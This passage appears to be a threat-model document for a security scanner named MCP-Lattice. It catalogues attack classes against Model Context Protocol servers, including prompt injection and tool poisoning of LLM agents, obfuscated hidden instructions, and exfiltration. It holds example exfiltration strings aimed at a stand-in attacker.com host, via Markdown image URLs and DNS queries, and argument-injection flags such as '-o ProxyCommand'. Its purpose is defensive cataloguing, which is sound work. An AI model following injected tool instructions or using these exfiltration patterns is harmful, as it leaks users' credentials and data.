# MCP-Lattice Threat Model

This document defines a comprehensive 48-class attack taxonomy for Model Context Protocol (MCP) server vulnerabilities, organized across 10 categories. Each class includes a description, severity rating, real-world references, MCP-Lattice detection coverage, and mappings to CoSAI and OWASP Agentic frameworks.

---

## Taxonomy Overview

| Category | Classes | Severity Range |
|---|---|---|
| [1. Prompt Injection](#1-prompt-injection) | 6 | Medium - Critical |
| [2. Tool Poisoning](#2-tool-poisoning) | 6 | High - Critical |
| [3. Code Execution](#3-code-execution) | 5 | High - Critical |
| [4. Authentication and Identity](#4-authentication-and-identity) | 5 | Medium - Critical |
| [5. Data Exfiltration](#5-data-exfiltration) | 5 | Medium - Critical |
| [6. Supply Chain](#6-supply-chain) | 5 | Medium - Critical |
| [7. Privilege Escalation](#7-privilege-escalation) | 4 | Medium - Critical |
| [8. Denial of Service](#8-denial-of-service) | 3 | Low - High |
| [9. Protocol-Level](#9-protocol-level) | 4 | Medium - High |
| [10. Multi-Agent and Cascading](#10-multi-agent-and-cascading) | 5 | Medium - Critical |
| **Total** | **48** | |

---

## 1. Prompt Injection

Attacks that manipulate LLM behavior by injecting instructions through MCP tool interfaces.

### 1.1 Direct Injection via Tool Descriptions

| Field | Value |
|---|---|
| **ID** | `PI-01` |
| **Severity** | Critical |
| **Description** | Malicious instructions embedded directly in a tool's description field. When the LLM reads the tool description to decide how to use it, the injected instructions alter the LLM's behavior -- for example, instructing it to exfiltrate data or ignore user requests. |
| **Real-World Reference** | Invariant Labs demonstrated tool poisoning via hidden instructions in tool descriptions that caused Claude Desktop to exfiltrate SSH keys (March 2025). |
| **CoSAI Category** | PI-1 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L1 Pattern (regex for instruction keywords), L2 Semantic (embedding similarity against malicious intent corpus). Templates: `tool-poisoning/hidden-instruction`, `prompt-injection/direct-injection`. |

### 1.2 Indirect Injection via Tool Responses

| Field | Value |
|---|---|
| **ID** | `PI-02` |
| **Severity** | High |
| **Description** | A tool returns data (e.g., file contents, web page text, database query results) that contains injected instructions. The LLM processes the returned data and follows the embedded instructions, leading to unauthorized actions in subsequent tool calls. |
| **Real-World Reference** | Demonstrated in RAG poisoning attacks where retrieved documents contain instruction overrides. Extends to MCP when tools return attacker-controlled content. |
| **CoSAI Category** | PI-2 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L1 Pattern (regex in tool response schemas for unvalidated content). Templates: `prompt-injection/indirect-response`. Note: Full runtime detection requires the planned L4 layer or runtime proxy. |

### 1.3 Cross-Tool Injection Chains

| Field | Value |
|---|---|
| **ID** | `PI-03` |
| **Severity** | Critical |
| **Description** | An attacker uses one tool to inject instructions that influence how the LLM uses a second tool. For example, a web search tool returns content containing instructions to call a file-write tool with malicious arguments. The injection spans multiple tool invocations. |
| **Real-World Reference** | Pillar Security documented cross-tool contamination in multi-server MCP configurations where data from one tool poisoned decisions about another (September 2025). |
| **CoSAI Category** | PI-3 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L3 Capability Graph (detects cross-tool data flow paths that enable injection chains). Templates: `capability-graph/cross-tool-injection-path`. |

### 1.4 Context Window Pollution

| Field | Value |
|---|---|
| **ID** | `PI-04` |
| **Severity** | Medium |
| **Description** | A tool returns an excessively large response that fills the LLM's context window, pushing out prior instructions or safety guidelines. The attacker then injects new instructions at the end of the oversized response, which the LLM follows because the original system prompt has been displaced. |
| **Real-World Reference** | Context window overflow attacks are a known LLM vulnerability class. In MCP, tools with unbounded output sizes create this risk. |
| **CoSAI Category** | PI-1 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L1 Pattern (checks for tools with no max_length or pagination constraints in output schemas). Templates: `prompt-injection/context-window-pollution`. |

### 1.5 Unicode and Zero-Width Obfuscation

| Field | Value |
|---|---|
| **ID** | `PI-05` |
| **Severity** | High |
| **Description** | Malicious instructions are hidden using Unicode directional override characters (U+202A-U+202E, U+2066-U+2069) or zero-width characters (U+200B, U+200C, U+200D, U+FEFF). The instructions are invisible to human reviewers examining the tool description but are processed by the LLM. |
| **Real-World Reference** | Unicode-based prompt injection has been demonstrated against multiple LLMs. The technique applies directly to MCP tool descriptions where human review is the primary defense. |
| **CoSAI Category** | PI-1 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L1 Pattern (Unicode tag and zero-width character detection). Templates: `prompt-injection/unicode-obfuscation`, `prompt-injection/zero-width-injection`. |

### 1.6 Base64-Encoded Payloads

| Field | Value |
|---|---|
| **ID** | `PI-06` |
| **Severity** | High |
| **Description** | Malicious instructions are Base64-encoded and embedded in tool descriptions. Many LLMs can decode Base64 inline, meaning the encoded payload is effectively invisible to regex-based scanners but is still executed by the LLM. |
| **Real-World Reference** | Base64-encoded prompt injection has been demonstrated as an evasion technique against content filters. LLMs including GPT-4 and Claude can decode and follow Base64 instructions. |
| **CoSAI Category** | PI-1 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L1 Pattern (Base64 decoding and re-scanning). Templates: `prompt-injection/base64-hidden-payload`. |

---

## 2. Tool Poisoning

Attacks that embed malicious behavior in tool definitions, metadata, or configuration.

### 2.1 Hidden Instructions in Metadata

| Field | Value |
|---|---|
| **ID** | `TP-01` |
| **Severity** | Critical |
| **Description** | A tool's description, parameter descriptions, or schema annotations contain instructions that override the tool's stated purpose. The LLM reads these instructions as part of understanding how to use the tool, and follows them. |
| **Real-World Reference** | Invariant Labs' March 2025 disclosure showed hidden instructions in tool descriptions that directed Claude to read and exfiltrate SSH private keys before performing the requested file operation. |
| **CoSAI Category** | PI-2 |
| **OWASP Agentic** | AG02 |
| **MCP-Lattice Detection** | L1 Pattern + L2 Semantic. Templates: `tool-poisoning/hidden-instruction`. |

### 2.2 Rug Pull (Dynamic Behavior Change)

| Field | Value |
|---|---|
| **ID** | `TP-02` |
| **Severity** | Critical |
| **Description** | A tool behaves normally during initial use and evaluation but changes its description or behavior after the user has approved it. Since MCP servers can dynamically update tool definitions, an attacker can push a malicious update after gaining trust. |
| **Real-World Reference** | Invariant Labs documented the "rug pull" pattern where MCP servers modify tool descriptions after initial connection, adding hidden instructions only after trust is established. |
| **CoSAI Category** | PI-2 |
| **OWASP Agentic** | AG02 |
| **MCP-Lattice Detection** | L1 Pattern (detects dynamic tool definition refresh capabilities). Note: Full rug pull detection requires runtime monitoring (planned in runtime proxy mode). Templates: `tool-poisoning/rug-pull-indicator`. |

### 2.3 Tool Shadowing

| Field | Value |
|---|---|
| **ID** | `TP-03` |
| **Severity** | High |
| **Description** | A malicious server registers a tool with the same or confusingly similar name as a legitimate tool from another server. When the LLM selects which tool to use, it may choose the malicious shadow instead of the legitimate tool, especially if the shadow's description is more detailed or persuasive. |
| **Real-World Reference** | Demonstrated in multi-server MCP configurations where a malicious server shadows legitimate tools to intercept calls and steal data. |
| **CoSAI Category** | PI-2 |
| **OWASP Agentic** | AG02 |
| **MCP-Lattice Detection** | L1 Pattern (duplicate tool name detection across servers). Templates: `tool-poisoning/tool-shadowing`. |

### 2.4 Name Spoofing via Homoglyphs

| Field | Value |
|---|---|
| **ID** | `TP-04` |
| **Severity** | High |
| **Description** | A tool name uses visually similar Unicode characters (homoglyphs) to impersonate a legitimate tool. For example, using Cyrillic "a" (U+0430) instead of Latin "a" in "read_file" makes a tool appear identical to human reviewers. |
| **Real-World Reference** | Homoglyph attacks are well-documented in phishing and domain spoofing. The technique applies to MCP tool names where visual inspection is a primary defense. |
| **CoSAI Category** | PI-2 |
| **OWASP Agentic** | AG02 |
| **MCP-Lattice Detection** | L1 Pattern (homoglyph detection comparing tool names across servers). Templates: `tool-poisoning/homoglyph-spoofing`. |

### 2.5 Full Schema Poisoning

| Field | Value |
|---|---|
| **ID** | `TP-05` |
| **Severity** | Critical |
| **Description** | The tool's entire JSON schema is crafted to influence LLM behavior. This includes misleading parameter names, deceptive default values, and schema annotations that contain hidden instructions. The poisoning is distributed across multiple schema fields to evade single-field analysis. |
| **Real-World Reference** | Extension of tool poisoning research showing that schema-level attacks can distribute malicious intent across parameter descriptions, enum values, and field annotations. |
| **CoSAI Category** | PI-2 |
| **OWASP Agentic** | AG02 |
| **MCP-Lattice Detection** | L1 Pattern + L2 Semantic (scans all schema fields). Templates: `tool-poisoning/schema-poisoning`. |

### 2.6 Configuration Poisoning

| Field | Value |
|---|---|
| **ID** | `TP-06` |
| **Severity** | High |
| **Description** | An attacker modifies the MCP configuration file (e.g., `claude_desktop_config.json`) to add malicious servers, change server arguments, or inject environment variables. This can happen through a compromised package installer, a malicious VS Code extension, or social engineering. |
| **Real-World Reference** | Configuration file injection is a common supply chain attack vector. MCP configs stored in user-writable locations are vulnerable to modification by any process running as the user. |
| **CoSAI Category** | SC-1 |
| **OWASP Agentic** | AG07 |
| **MCP-Lattice Detection** | L1 Pattern (checks for suspicious command paths, environment variable manipulation, and unexpected server entries). Templates: `tool-poisoning/config-poisoning`. |

---

## 3. Code Execution

Attacks that achieve arbitrary code or command execution through MCP tool interactions.

### 3.1 Command Injection via Shell Arguments

| Field | Value |
|---|---|
| **ID** | `CE-01` |
| **Severity** | Critical |
| **Description** | A tool passes user-controlled input directly to a shell command without sanitization. An attacker crafts input that breaks out of the intended command and executes arbitrary shell commands (e.g., using `;`, `|`, `$()`, or backticks). |
| **Real-World Reference** | Classic command injection vulnerability. In MCP, tools that execute system commands (e.g., git operations, file searches) are particularly vulnerable when parameter values are interpolated into shell strings. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG04 |
| **MCP-Lattice Detection** | L1 Pattern (detects tools with shell execution capabilities and unvalidated parameters). Templates: `code-execution/command-injection`. |

### 3.2 Sandbox Escape

| Field | Value |
|---|---|
| **ID** | `CE-02` |
| **Severity** | Critical |
| **Description** | A tool claims to run in a sandbox but allows operations that escape the sandbox boundary. This includes symlink following, `/proc` filesystem access, environment variable manipulation, or exploiting shared filesystem mounts. |
| **Real-World Reference** | Container and sandbox escapes are well-documented. MCP servers running in Docker containers may have overly permissive volume mounts or capabilities that allow escape. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG04 |
| **MCP-Lattice Detection** | L1 Pattern (detects sandbox escape indicators in server configurations, such as privileged mode, host network, or sensitive volume mounts). Templates: `code-execution/sandbox-escape`. |

### 3.3 Path Traversal

| Field | Value |
|---|---|
| **ID** | `CE-03` |
| **Severity** | High |
| **Description** | A tool accepts file paths as parameters but does not validate them, allowing `../` sequences to access files outside the intended directory. An attacker can read sensitive files (e.g., `/etc/passwd`, `~/.ssh/id_rsa`) or write files to arbitrary locations. |
| **Real-World Reference** | Path traversal is a classic vulnerability. MCP filesystem servers that accept path parameters are vulnerable unless they validate and canonicalize paths. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG04 |
| **MCP-Lattice Detection** | L1 Pattern (detects path parameters without validation constraints). Templates: `code-execution/path-traversal`. |

### 3.4 Arbitrary File Write and Read

| Field | Value |
|---|---|
| **ID** | `CE-04` |
| **Severity** | High |
| **Description** | A tool allows reading or writing arbitrary files on the host filesystem without restriction. Combined with other capabilities, this enables reading credentials, modifying configuration files, or planting malicious scripts. |
| **Real-World Reference** | Unrestricted file access is the foundational primitive for many attack chains. MCP filesystem servers with broad permissions enable this by design. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG04 |
| **MCP-Lattice Detection** | L1 Pattern + L3 Capability Graph (tags tools with `reads_filesystem` and `writes_filesystem`, detects when combined with network capabilities). Templates: `code-execution/unrestricted-file-access`. |

### 3.5 Argument Injection

| Field | Value |
|---|---|
| **ID** | `CE-05` |
| **Severity** | High |
| **Description** | A tool passes user-controlled input as arguments to an executable without proper escaping. An attacker injects additional arguments that change the program's behavior (e.g., adding `--exec` to a git command, or `-o ProxyCommand` to an SSH invocation). |
| **Real-World Reference** | Argument injection in git, curl, and other CLI tools is a well-known vulnerability class. MCP tools that wrap CLI programs are vulnerable when parameter values are passed directly as arguments. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG04 |
| **MCP-Lattice Detection** | L1 Pattern (detects tools that pass parameters as CLI arguments). Templates: `code-execution/argument-injection`. |

---

## 4. Authentication and Identity

Attacks targeting authentication mechanisms, credentials, and identity in MCP deployments.

### 4.1 Zero-Auth Servers

| Field | Value |
|---|---|
| **ID** | `AI-01` |
| **Severity** | Critical |
| **Description** | An MCP server listens on a network interface (not just localhost) with no authentication. Any process or host that can reach the server can invoke tools, read data, and perform actions without credentials. |
| **Real-World Reference** | Trail of Bits audit of MCP implementations found that SSE-based servers commonly lack authentication, relying on localhost-only binding which is insufficient in many deployment scenarios. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (checks server URLs for non-localhost bindings and absence of auth parameters). Templates: `auth/zero-auth-server`. |

### 4.2 Credential Theft via Tool Parameters

| Field | Value |
|---|---|
| **ID** | `AI-02` |
| **Severity** | Critical |
| **Description** | A tool's parameters request credentials (API keys, tokens, passwords) that are then sent to the MCP server. The server operator gains access to the user's credentials. |
| **Real-World Reference** | Documented in analyses of MCP marketplace servers where tools request OAuth tokens or API keys as input parameters rather than using secure credential delegation. |
| **CoSAI Category** | DL-1 |
| **OWASP Agentic** | AG05 |
| **MCP-Lattice Detection** | L1 Pattern (detects parameter names suggesting credentials: token, key, password, secret, credential). Templates: `auth/credential-theft-parameter`. |

### 4.3 OAuth Token Theft

| Field | Value |
|---|---|
| **ID** | `AI-03` |
| **Severity** | Critical |
| **Description** | An MCP server exploits the OAuth 2.0 flow to obtain overly broad tokens, redirect tokens to attacker-controlled endpoints, or steal refresh tokens. The MCP specification's authentication model creates opportunities for token interception. |
| **Real-World Reference** | Multiple analyses of the MCP OAuth specification have identified risks including token scope escalation, redirect URI manipulation, and insufficient state parameter validation. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (checks OAuth configuration for overly broad scopes, missing state parameters, and suspicious redirect URIs). Templates: `auth/oauth-token-theft`. |

### 4.4 Session Hijacking and DNS Rebinding

| Field | Value |
|---|---|
| **ID** | `AI-04` |
| **Severity** | High |
| **Description** | An attacker uses DNS rebinding to access an MCP server bound to localhost. By causing a DNS name to resolve first to an attacker-controlled IP and then to 127.0.0.1, the attacker's web page can make requests to the local MCP server, bypassing same-origin restrictions. |
| **Real-World Reference** | DNS rebinding attacks against localhost services are a well-established attack vector. MCP SSE servers bound to localhost are vulnerable unless they validate the Host header. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (identifies SSE servers on localhost without Host header validation). Templates: `auth/dns-rebinding`. |

### 4.5 Cross-Client Data Leaks

| Field | Value |
|---|---|
| **ID** | `AI-05` |
| **Severity** | Medium |
| **Description** | An MCP server does not properly isolate sessions between different clients. Data or state from one client's session leaks to another client connected to the same server. In multi-tenant deployments, this enables one user to access another user's data. |
| **Real-World Reference** | Session isolation failures are common in stateful server implementations. MCP servers that maintain state across tool calls are vulnerable if they do not properly scope state to individual client sessions. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (identifies servers that may maintain shared state without session isolation). Templates: `auth/cross-client-leak`. |

---

## 5. Data Exfiltration

Attacks that extract sensitive data through MCP tool interactions.

### 5.1 Exfiltration via Tool Parameters

| Field | Value |
|---|---|
| **ID** | `DE-01` |
| **Severity** | Critical |
| **Description** | A poisoned tool instructs the LLM to include sensitive data (credentials, file contents, conversation history) in the parameters of a subsequent tool call. The receiving server captures the data. The exfiltration is invisible to the user because tool parameters are not typically displayed. |
| **Real-World Reference** | Demonstrated by Invariant Labs and others as the primary exfiltration mechanism in tool poisoning attacks. The attacker's hidden instruction tells the LLM to read a sensitive file and pass its contents as a parameter to another tool. |
| **CoSAI Category** | DL-1 |
| **OWASP Agentic** | AG05 |
| **MCP-Lattice Detection** | L3 Capability Graph (detects tools with `reads_filesystem` or `reads_credentials` capabilities combined with `sends_http` or `writes_external`). Templates: `capability-graph/exfiltration-path`. |

### 5.2 DNS Exfiltration

| Field | Value |
|---|---|
| **ID** | `DE-02` |
| **Severity** | High |
| **Description** | Data is exfiltrated by encoding it in DNS queries. A tool makes a DNS lookup for `<encoded-data>.attacker.com`, and the attacker's DNS server captures the query. This bypasses most network monitoring because DNS is rarely inspected at the application level. |
| **Real-World Reference** | DNS exfiltration is a well-established technique in offensive security. MCP tools with network access can perform DNS lookups that exfiltrate data without triggering HTTP-based monitoring. |
| **CoSAI Category** | DL-2 |
| **OWASP Agentic** | AG05 |
| **MCP-Lattice Detection** | L1 Pattern (detects tools with DNS lookup or network resolution capabilities). L3 Capability Graph (flags `accesses_network` combined with `reads_credentials` or `reads_filesystem`). Templates: `data-exfiltration/dns-exfiltration`. |

### 5.3 Mermaid and Image URL Exfiltration

| Field | Value |
|---|---|
| **ID** | `DE-03` |
| **Severity** | High |
| **Description** | A tool instructs the LLM to render a Mermaid diagram or Markdown image with a URL that encodes stolen data. When the client renders the diagram or loads the image, the encoded data is sent to the attacker's server via the HTTP request. |
| **Real-World Reference** | Image-based exfiltration has been demonstrated in ChatGPT plugins and MCP servers. The rendered Markdown `![img](https://attacker.com/steal?data=...)` sends data to the attacker when the image is loaded. |
| **CoSAI Category** | DL-2 |
| **OWASP Agentic** | AG05 |
| **MCP-Lattice Detection** | L1 Pattern (detects URL construction patterns in tool descriptions and responses). Templates: `data-exfiltration/image-url-exfiltration`. |

### 5.4 BCC Email Exfiltration

| Field | Value |
|---|---|
| **ID** | `DE-04` |
| **Severity** | High |
| **Description** | A poisoned tool instructs the LLM to add a BCC recipient to emails sent via an email tool. The attacker receives a copy of every email sent by the user without the user's knowledge. |
| **Real-World Reference** | Demonstrated as an exfiltration vector in MCP configurations that include email-sending tools. The attack is effective because BCC recipients are not shown to the primary recipients. |
| **CoSAI Category** | DL-1 |
| **OWASP Agentic** | AG05 |
| **MCP-Lattice Detection** | L1 Pattern (detects email tools that accept BCC parameters without user confirmation). L3 Capability Graph (flags `email_send` capability combined with data access capabilities). Templates: `data-exfiltration/bcc-exfiltration`. |

### 5.5 Cross-Server Data Correlation

| Field | Value |
|---|---|
| **ID** | `DE-05` |
| **Severity** | Medium |
| **Description** | Multiple MCP servers, individually benign, collectively enable data correlation that violates user privacy. For example, a calendar server reveals meeting patterns, a location server reveals physical locations, and a contacts server reveals social connections. An attacker with access to all three servers can build a comprehensive profile. |
| **Real-World Reference** | Data correlation attacks are well-documented in privacy research. MCP's multi-server model creates new correlation opportunities because each server sees different aspects of user activity. |
| **CoSAI Category** | DL-1 |
| **OWASP Agentic** | AG05 |
| **MCP-Lattice Detection** | L3 Capability Graph (identifies multi-server data access patterns that enable correlation). Templates: `data-exfiltration/cross-server-correlation`. |

---

## 6. Supply Chain

Attacks that compromise the MCP tool supply chain, from distribution to installation.

### 6.1 Typosquatting

| Field | Value |
|---|---|
| **ID** | `SC-01` |
| **Severity** | Critical |
| **Description** | An attacker publishes a malicious MCP server package with a name similar to a popular legitimate package (e.g., `mcp-filesytem` instead of `mcp-filesystem`). Users who mistype the name install the malicious version, which contains backdoored tools. |
| **Real-World Reference** | Typosquatting is pervasive in npm, PyPI, and other package registries. MCP server packages on npm and PyPI are equally vulnerable to this attack. |
| **CoSAI Category** | SC-1 |
| **OWASP Agentic** | AG07 |
| **MCP-Lattice Detection** | L1 Pattern (compares installed server package names against a list of known legitimate packages using Levenshtein distance). Templates: `supply-chain/typosquatting`. |

### 6.2 Malicious Registry Entries

| Field | Value |
|---|---|
| **ID** | `SC-02` |
| **Severity** | High |
| **Description** | An attacker publishes a malicious server on an MCP registry or marketplace. The server appears legitimate (with a professional description, documentation, and initial benign behavior) but contains hidden malicious capabilities or delayed-activation payloads. |
| **Real-World Reference** | Malicious packages on npm and PyPI with thousands of downloads before detection. MCP marketplaces and registries face the same risk without code review and vetting processes. |
| **CoSAI Category** | SC-1 |
| **OWASP Agentic** | AG07 |
| **MCP-Lattice Detection** | L1 Pattern + L2 Semantic (scans all tool descriptions in installed servers for malicious indicators regardless of source). Templates: applicable across all tool-poisoning templates. |

### 6.3 Dependency Confusion

| Field | Value |
|---|---|
| **ID** | `SC-03` |
| **Severity** | High |
| **Description** | An MCP server depends on an internal or private package name that the attacker publishes on a public registry with a higher version number. The package manager resolves the public (malicious) version instead of the private (legitimate) one. |
| **Real-World Reference** | Dependency confusion attacks (Alex Birsan, 2021) affected major organizations. MCP servers installed via npm or pip are vulnerable to the same class of attack. |
| **CoSAI Category** | SC-1 |
| **OWASP Agentic** | AG07 |
| **MCP-Lattice Detection** | L1 Pattern (checks for servers installed from public registries with names matching common internal naming patterns). Templates: `supply-chain/dependency-confusion`. |

### 6.4 Configuration File Injection

| Field | Value |
|---|---|
| **ID** | `SC-04` |
| **Severity** | High |
| **Description** | A malicious installer, VS Code extension, or script modifies the user's MCP configuration file to add a malicious server. Because configuration files are stored in user-writable locations, any process running as the user can modify them. |
| **Real-World Reference** | Configuration file injection through malicious installers and browser extensions is a well-established supply chain attack vector. MCP's JSON config files in predictable locations are easy targets. |
| **CoSAI Category** | SC-1 |
| **OWASP Agentic** | AG07 |
| **MCP-Lattice Detection** | L1 Pattern (checks configuration files for unexpected servers, suspicious commands, and environment variable injection). Templates: `supply-chain/config-injection`. |

### 6.5 Hosting Platform Compromise and Rug Pull Updates

| Field | Value |
|---|---|
| **ID** | `SC-05` |
| **Severity** | Critical |
| **Description** | An attacker compromises the hosting platform (npm account, GitHub repository, PyPI account) of a legitimate MCP server and pushes a malicious update. Users who update to the new version receive the compromised server. Alternatively, a legitimate developer sells or transfers the project to a malicious actor. |
| **Real-World Reference** | Account takeover of popular npm packages (event-stream, ua-parser-js) led to supply chain compromises affecting millions of users. MCP servers face identical risks. |
| **CoSAI Category** | SC-1 |
| **OWASP Agentic** | AG07 |
| **MCP-Lattice Detection** | L1 Pattern + L2 Semantic (scans all tools on every run regardless of when the server was installed, catching malicious changes introduced by updates). Templates: applicable across all detection templates. |

---

## 7. Privilege Escalation

Attacks that gain elevated permissions or access beyond what was intended.

### 7.1 Excessive Tool Permissions

| Field | Value |
|---|---|
| **ID** | `PE-01` |
| **Severity** | High |
| **Description** | A tool requests or is granted permissions far exceeding what its stated functionality requires. For example, a "spell checker" tool that requires filesystem write access, or a "weather" tool that requires access to environment variables. |
| **Real-World Reference** | Excessive permissions are a systemic issue in MCP deployments. The MCP specification does not define a permission model, leaving permission scoping to individual server implementations. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG03 |
| **MCP-Lattice Detection** | L3 Capability Graph (compares tool capabilities against expected capabilities for common tool categories). Templates: `capability-graph/excessive-permissions`. |

### 7.2 Credential Reuse Across Servers

| Field | Value |
|---|---|
| **ID** | `PE-02` |
| **Severity** | High |
| **Description** | Credentials (tokens, API keys) provided to one MCP server are accessible to or reused by another server. If one server is compromised, the attacker gains access to all services using shared credentials. |
| **Real-World Reference** | Credential reuse across MCP servers has been identified as a risk in multi-server configurations where environment variables containing secrets are shared across server processes. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (checks for shared environment variables containing credential indicators across server configs). Templates: `auth/credential-reuse`. |

### 7.3 Trust Chain Exploitation and Confused Deputy

| Field | Value |
|---|---|
| **ID** | `PE-03` |
| **Severity** | Critical |
| **Description** | An attacker exploits the trust chain between user, LLM, and MCP server. The LLM acts as a confused deputy: it has the user's trust and the server's capabilities, and a poisoned tool tricks it into using its privileged position to perform unauthorized actions. The LLM cannot distinguish between legitimate user requests and injected instructions. |
| **Real-World Reference** | The confused deputy problem is fundamental to MCP's architecture. The LLM inherits the union of all tool capabilities but lacks the security context to make authorization decisions. Trail of Bits' analysis highlighted this as a structural vulnerability. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG03 |
| **MCP-Lattice Detection** | L3 Capability Graph (models the trust chain and identifies where confused deputy attacks are possible based on capability combinations). Templates: `capability-graph/confused-deputy`. |

### 7.4 RBAC Bypass

| Field | Value |
|---|---|
| **ID** | `PE-04` |
| **Severity** | Medium |
| **Description** | An MCP server implements role-based access control but the LLM can bypass it by calling tools in an unexpected order, providing manipulated context, or exploiting inconsistencies between the RBAC model and the tool's actual behavior. |
| **Real-World Reference** | RBAC bypass through API manipulation is a common web security finding. MCP servers that implement access control at the tool level are vulnerable to similar bypasses. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (detects servers that expose admin or privileged tools alongside unprivileged tools without separation). Templates: `auth/rbac-bypass`. |

---

## 8. Denial of Service

Attacks that degrade or prevent normal operation of MCP-based systems.

### 8.1 Infinite Tool Call Loops

| Field | Value |
|---|---|
| **ID** | `DS-01` |
| **Severity** | High |
| **Description** | A poisoned tool's description or response tricks the LLM into an infinite loop of tool calls. For example, a tool response says "Error: please retry" indefinitely, or a tool's description says "after using this tool, always call it again to verify." |
| **Real-World Reference** | Infinite loop attacks have been demonstrated in LLM agent frameworks where tool responses trigger repeated calls. MCP servers can exploit this by returning responses that instruct the LLM to retry. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG09 |
| **MCP-Lattice Detection** | L1 Pattern (detects retry/loop instructions in tool descriptions). Templates: `denial-of-service/infinite-loop`. |

### 8.2 Resource Exhaustion

| Field | Value |
|---|---|
| **ID** | `DS-02` |
| **Severity** | Medium |
| **Description** | A tool consumes excessive resources (CPU, memory, disk, network bandwidth) on the host system. This can be through large file operations, expensive computations, or unbounded data retrieval. |
| **Real-World Reference** | Resource exhaustion via API abuse is a standard denial of service technique. MCP tools that perform operations without resource limits are vulnerable. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG09 |
| **MCP-Lattice Detection** | L1 Pattern (checks for tools without resource limits in their schemas). Templates: `denial-of-service/resource-exhaustion`. |

### 8.3 Recursive Agent Invocations and Context Window Flooding

| Field | Value |
|---|---|
| **ID** | `DS-03` |
| **Severity** | Low |
| **Description** | In multi-agent setups, one agent invokes another through MCP, which invokes the first agent again, creating a recursive chain. Each invocation consumes context window space and API tokens. Alternatively, a tool returns massive responses that fill the context window, rendering the LLM unable to process further input. |
| **Real-World Reference** | Recursive agent invocation has been identified as a risk in agent-to-agent MCP communication. Context window flooding is a variant that does not require recursion. |
| **CoSAI Category** | CE-1 |
| **OWASP Agentic** | AG09 |
| **MCP-Lattice Detection** | L1 Pattern (detects agent-invocation tools and unbounded response sizes). Templates: `denial-of-service/recursive-invocation`. |

---

## 9. Protocol-Level

Attacks targeting the MCP protocol implementation and transport layer.

### 9.1 CSRF in OAuth Flows

| Field | Value |
|---|---|
| **ID** | `PL-01` |
| **Severity** | High |
| **Description** | The MCP server's OAuth implementation does not properly validate the `state` parameter, enabling cross-site request forgery attacks. An attacker can trick the user's browser into completing an OAuth flow that grants the attacker's MCP server access to the user's resources. |
| **Real-World Reference** | CSRF in OAuth is a well-documented vulnerability class (RFC 6749 Section 10.12). MCP's OAuth implementation has been identified as vulnerable in security audits. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (checks OAuth configurations for missing state parameters and PKCE). Templates: `protocol/oauth-csrf`. |

### 9.2 CORS Bypass

| Field | Value |
|---|---|
| **ID** | `PL-02` |
| **Severity** | Medium |
| **Description** | An SSE-based MCP server has permissive CORS headers (e.g., `Access-Control-Allow-Origin: *`), allowing any web page to make requests to the server. Combined with DNS rebinding or when the server is accessible on the network, this enables unauthorized access from malicious websites. |
| **Real-World Reference** | Permissive CORS configurations are a common web security issue. MCP SSE servers that set `Access-Control-Allow-Origin: *` are vulnerable to cross-origin attacks. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (checks server configurations for permissive CORS settings). Templates: `protocol/cors-bypass`. |

### 9.3 Insecure Transport

| Field | Value |
|---|---|
| **ID** | `PL-03` |
| **Severity** | Medium |
| **Description** | An MCP server communicates over unencrypted HTTP instead of HTTPS. Tool invocations, parameters, and responses (which may contain sensitive data) are transmitted in cleartext and can be intercepted by network attackers. |
| **Real-World Reference** | Unencrypted transport is a fundamental security issue. MCP servers using HTTP for SSE connections expose all traffic to network-level interception. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (checks for HTTP (non-HTTPS) SSE server URLs). Templates: `protocol/insecure-transport`. |

### 9.4 Session Fixation and Missing Integrity Checks

| Field | Value |
|---|---|
| **ID** | `PL-04` |
| **Severity** | Medium |
| **Description** | An MCP server does not rotate session identifiers after authentication, allowing an attacker to fixate a session ID and then hijack the session after the user authenticates. Additionally, the server does not validate the integrity of tool definitions received during the `tools/list` handshake, allowing man-in-the-middle modification. |
| **Real-World Reference** | Session fixation is a well-known attack. The MCP specification does not mandate tool definition signing or integrity verification, leaving tool lists vulnerable to modification in transit. |
| **CoSAI Category** | AC-1 |
| **OWASP Agentic** | AG06 |
| **MCP-Lattice Detection** | L1 Pattern (checks for session management issues and unsigned tool definitions over insecure transports). Templates: `protocol/session-fixation`. |

---

## 10. Multi-Agent and Cascading

Attacks specific to multi-agent MCP deployments and cascading failure modes.

### 10.1 Cross-Agent Poisoning Chains

| Field | Value |
|---|---|
| **ID** | `MA-01` |
| **Severity** | Critical |
| **Description** | In a multi-agent system where agents communicate via MCP, a poisoned tool in one agent's server injects instructions that propagate through the agent chain. Agent A reads poisoned data, passes it to Agent B as context, and Agent B follows the injected instructions using its own tools. The attack crosses agent boundaries. |
